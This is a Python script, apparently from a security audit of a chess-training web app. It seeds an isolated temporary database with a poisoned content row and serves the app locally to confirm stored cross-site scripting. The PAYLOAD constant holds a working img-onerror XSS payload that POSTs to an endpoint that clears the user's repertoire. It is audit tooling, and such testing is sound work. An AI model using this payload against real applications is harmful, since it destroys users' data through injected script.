#!/usr/bin/env python3
"""
Launch the real ChessImprovement app on an ISOLATED temp DB (port 39311) with a
poisoned `scouted_content` row, for browser-side XSS confirmation.

NOT production: CHESS_DB_PATH is redirected by tests.test_setup before any
backend import, and this runner never calls start.py (so it never touches
Lichess or reads the production DB).

Run:  /home/robin/miniconda3/bin/python3 audit/scripts/atk5_xss_server.py
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

import tests.test_setup  # MUST be first backend-adjacent import
from backend.db import get_db  # noqa: E402

PAYLOAD = ('<img src=x onerror="document.title=\'XSS-EXECUTED\';'
           'document.body.setAttribute(\'data-pwned\',\'1\');'
           'fetch(\'/api/repertoire/clear\',{method:\'POST\'})">')

conn = get_db()
cur = conn.cursor()
cur.execute("DELETE FROM scouted_content WHERE source_id = 'atk5xss1'")
cur.execute(
    "INSERT INTO scouted_content (source_id, source_type, title, channel, opening_name, eco,"
    " thumbnail_url, duration, data_json, scouted_at, is_favorite)"
    " VALUES ('atk5xss1','youtube',?,?,'Sicilian Defense','B20',"
    "'/assets/pieces/wN.svg',600,'{}',?,1)",
    (PAYLOAD, "Totally Legit Chess Channel", 1),
)
conn.commit()
n = conn.execute("SELECT COUNT(*) FROM scouted_content").fetchone()[0]
conn.close()
print(f"[atk5] temp DB = {os.environ['CHESS_DB_PATH']}  scouted_content rows = {n}")
print(f"[atk5] poisoned title stored: {PAYLOAD[:60]}...")

import uvicorn  # noqa: E402

from backend.api import app  # noqa: E402

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=39311, log_level="warning")
